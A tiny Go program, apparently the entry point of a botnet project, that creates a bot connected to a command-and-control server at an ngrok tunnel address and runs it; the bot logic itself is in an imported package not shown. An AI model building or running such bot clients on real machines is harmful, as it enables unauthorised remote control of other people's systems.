package main

import (
	"log"

	"github.com/adrianosela/botnet/bot"
)

func main() {
	b, err := bot.NewBot("9160a31f.ngrok.io")
	if err != nil {
		log.Fatal(err)
	}
	b.Run()
}
